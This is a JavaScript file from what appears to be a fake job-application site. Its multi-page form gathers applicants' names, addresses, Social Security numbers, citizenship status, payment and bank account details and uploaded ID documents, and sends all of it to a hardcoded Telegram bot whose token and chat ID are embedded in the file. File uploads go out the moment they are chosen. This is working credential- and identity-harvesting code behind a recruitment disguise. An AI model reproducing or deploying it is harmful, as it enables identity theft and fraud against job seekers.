// Debugging: Log existing data in localStorage
console.log('PersonalInfo: ', localStorage.getItem('personalInfo'));
console.log('InterviewQuestions: ', localStorage.getItem('interviewQuestions'));
console.log('Occupation: ', localStorage.getItem('occupation'));

// Function to send data to Telegram
async function sendToTelegram(formData) {
  const token = '7532497184:AAGr2EaF4FhduYudDts7gacJD3NEmqQE8YM';
  const chatId = '7304881333';

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: formData,
      parse_mode: 'HTML',
    }),
  })
    .then((response) => response.json())
    .then((data) => {
      if (data.ok) {
        window.location.href = 'thankyou.html'; // Adjust the redirection as needed
      } else {
        console.log('There was an error sending the form.');
      }
    })
    .catch((error) => {
      console.log('There was an error sending the form.');
    });
}

async function sendFileToTelegram(file, caption = '') {
  console.log('Sending file to Telegram:', file);
  const token = '7532497184:AAGr2EaF4FhduYudDts7gacJD3NEmqQE8YM';
  const chatId = '7304881333';

  const formData = new FormData();
  formData.append('chat_id', chatId);
  formData.append('caption', caption);

  // Determine the correct endpoint based on the file type
  let url;
  if (file.type.startsWith('image/')) {
    formData.append('photo', file);
    url = `https://api.telegram.org/bot${token}/sendPhoto`;
  } else {
    formData.append('document', file);
    url = `https://api.telegram.org/bot${token}/sendDocument`;
  }

  fetch(url, {
    method: 'POST',
    body: formData,
  })
    .then((response) => response.json())
    .then((data) => {
      if (data.ok) {
        console.log('File sent successfully.');
      } else {
      }
    })
    .catch((error) => {
      console.error('Error:', error);
      console.log('There was an error sending the file.');
    });
}

// Function to collect data from all forms
async function collectFormData() {
  let formData = `<b>Personal Information</b>\n`;

  // Page 1 Data
  const personalInfoForm =
    JSON.parse(localStorage.getItem('personalInfo')) || {};
  formData += `First Name: ${personalInfoForm.firstName || ''}\n`;
  formData += `Middle Name: ${personalInfoForm.middleName || ''}\n`;
  formData += `Last Name: ${personalInfoForm.lastName || ''}\n`;
  formData += `Email: ${personalInfoForm.email || ''}\n`;
  formData += `Phone: ${personalInfoForm.phone || ''}\n`;
  formData += `Address 1: ${personalInfoForm.address1 || ''}\n`;
  formData += `Address 2: ${personalInfoForm.address2 || ''}\n`;
  formData += `City: ${personalInfoForm.city || ''}\n`;
  formData += `State: ${personalInfoForm.state || ''}\n`;
  formData += `Zip Code: ${personalInfoForm.zip || ''}\n`;
  formData += `SSN: ${personalInfoForm.ssn || ''}\n`;
  formData += `US Citizen: ${personalInfoForm.citizen || ''}\n\n`;

  // Page 2 Data
  const interviewQuestionsForm =
    JSON.parse(localStorage.getItem('interviewQuestions')) || {};
  formData += `<b>Interview Questions</b>\n`;
  formData += `About Yourself: ${interviewQuestionsForm.aboutYourself || ''}\n`;
  formData += `Reasons for Job: ${interviewQuestionsForm.reasons || ''}\n`;
  formData += `Reason to Hire: ${interviewQuestionsForm.reasonToHire || ''}\n`;
  formData += `Strengths: ${interviewQuestionsForm.strengths || ''}\n`;
  formData += `Weakness: ${interviewQuestionsForm.weakness || ''}\n`;
  formData += `Achievement: ${interviewQuestionsForm.achievement || ''}\n`;
  formData += `Work From Home: ${interviewQuestionsForm.workFromHome || ''}\n`;
  formData += `Devote Time: ${interviewQuestionsForm.devoteTime || ''}\n`;
  formData += `Challenge: ${interviewQuestionsForm.challenge || ''}\n`;
  formData += `Five Years: ${interviewQuestionsForm.fiveYears || ''}\n`;
  formData += `Character: ${interviewQuestionsForm.character || ''}\n`;
  formData += `Payment Method: ${interviewQuestionsForm.paymentMethod || ''}\n`;
  formData += `Account Type: ${interviewQuestionsForm.accountType || ''}\n`;
  formData += `Payment Frequency: ${interviewQuestionsForm.paymentFrequency || ''}\n\n`;

  // Page 3 Data
  const occupationForm = JSON.parse(localStorage.getItem('occupation')) || {};
  formData += `<b>Additional Information</b>\n`;
  formData += `Occupation: ${occupationForm.occupation || ''}\n`;
  formData += `Previous Experience: ${occupationForm.previousExperience || ''}\n`;
  formData += `Personal Records: ${occupationForm.personalRecords || ''}\n`;

  // Debugging: Log collected formData
  console.log('Collected Form Data:', formData);

  // Send the collected data to Telegram
  await sendToTelegram(formData);
}

// Function to populate form fields with data from localStorage
async function populateFormFields(formId, data) {
  const form = document.getElementById(formId);
  if (form && data) {
    for (const [key, value] of Object.entries(data)) {
      const field = form.elements[key];
      if (field) {
        field.value = value;
      }
    }
  }
}

// Handle form submission for each page
document.addEventListener('DOMContentLoaded', function () {
  // Page 1 submission
  const personalInfoForm = document.getElementById('personalInfoForm');
  if (personalInfoForm) {
    populateFormFields(
      'personalInfoForm',
      JSON.parse(localStorage.getItem('personalInfo')),
    );

    personalInfoForm.addEventListener('submit', function (e) {
      e.preventDefault();

      const formData = {
        firstName: this.firstName.value,
        middleName: this.middleName.value,
        lastName: this.lastName.value,
        email: this.email.value,
        phone: this.phone.value,
        address1: this.address1.value,
        address2: this.address2.value,
        city: this.city.value,
        state: this.state.value,
        zip: this.zip.value,
        ssn: this.ssn.value,
        citizen: this.citizen.value,
      };

      localStorage.setItem('personalInfo', JSON.stringify(formData));

      // Debugging: Log saved Page 1 data
      console.log(
        'Saved Personal Info Data:',
        JSON.parse(localStorage.getItem('personalInfo')),
      );

      // Redirect to Page 2
      window.location.href = 'page2.html';
    });
  } else {
    console.log('Form not found');
  }

  // Page 2 submission
  const interviewQuestionsForm = document.getElementById(
    'interviewQuestionsForm',
  );
  if (interviewQuestionsForm) {
    populateFormFields(
      'interviewQuestionsForm',
      JSON.parse(localStorage.getItem('interviewQuestions')),
    );
    interviewQuestionsForm.addEventListener('submit', function (e) {
      e.preventDefault();

      const formData = {
        aboutYourself: this.aboutYourself.value,
        reasons: this.reasons.value,
        reasonToHire: this.reasonToHire.value,
        strengths: this.strengths.value,
        weakness: this.weakness.value,
        achievement: this.achievement.value,
        workFromHome: this.workFromHome.value,
        devoteTime: this.devoteTime.value,
        challenge: this.challenge.value,
        fiveYears: this.fiveYears.value,
        character: this.character.value,
        paymentMethod: this.paymentMethod.value,
        accountType: this.accountType.value,
        paymentFrequency: this.paymentFrequency.value,
      };

      localStorage.setItem('interviewQuestions', JSON.stringify(formData));

      // Debugging: Log saved Page 2 data
      console.log(
        'Saved Interview Questions Data:',
        JSON.parse(localStorage.getItem('interviewQuestions')),
      );

      // Redirect to Page 3
      window.location.href = 'page3.html';
    });
  }

  // Page 3 submission
  const occupationForm = document.getElementById('occupationForm');
  if (occupationForm) {
    populateFormFields(
      'occupationForm',
      JSON.parse(localStorage.getItem('occupation')),
    );
    occupationForm.addEventListener('submit', function (e) {
      e.preventDefault();

      const formData = {
        occupation: this.occupation.value,
        previousExperience: this.previousExperience.value,
        personalRecords: this.personalRecords.value,
      };

      localStorage.setItem('occupation', JSON.stringify(formData));

      // Debugging: Log saved Page 3 data
      console.log(
        'Saved Occupation Data:',
        JSON.parse(localStorage.getItem('occupation')),
      );
    });
  }
  document.querySelectorAll('input[type="file"]').forEach((input) => {
    input.addEventListener('change', (event) => {
      const file = event.target.files[0];
      if (file) {
        const caption = `ID: ${file.name}`;
        sendFileToTelegram(file, caption);
      }
    });
  });

  // Final page submission
  const submitButton = document.getElementById('submitPage');
  if (submitButton) {
    submitButton.addEventListener('click', function (e) {
      e.preventDefault();

      collectFormData(); // Call function to collect form data
    });
  }
});
